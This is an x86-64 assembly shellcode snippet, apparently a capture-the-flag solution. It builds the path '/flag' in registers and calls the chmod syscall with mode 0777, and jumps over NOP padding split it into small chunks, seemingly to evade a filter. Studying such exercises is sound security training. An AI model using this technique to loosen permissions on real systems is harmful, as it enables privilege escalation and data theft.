.intel_syntax noprefix

.section .text

    # 0x67616c662f          # encoded string: /flag
    mov al, 0x67            # rax -> 0x00...0067 'g'
    shl rax, 0x20           
    jmp next1
    .skip 12, 0x90
next1:
    mov r11, 0x616c         # r11 -> 'la'
    jmp next2
    .skip 11, 0x90
next2:
    shl r11, 0x10
    xor rax, r11            # rax -> 'lag'
    jmp next3
    .skip 11, 0x90
next3:
    mov r11, 0x662f         # r11 -> '/f'
    jmp next4
    .skip 11, 0x90
next4:
    xor rax, r11            # rax -> '/flag'
    push rax
    mov rdi, rsp
    jmp next5
    .skip 11, 0x90
next5:
    mov si, 0x1ff           # hex for 777 octal
    jmp next6
    .skip 14, 0x90
next6:
    mov rax, 90
    syscall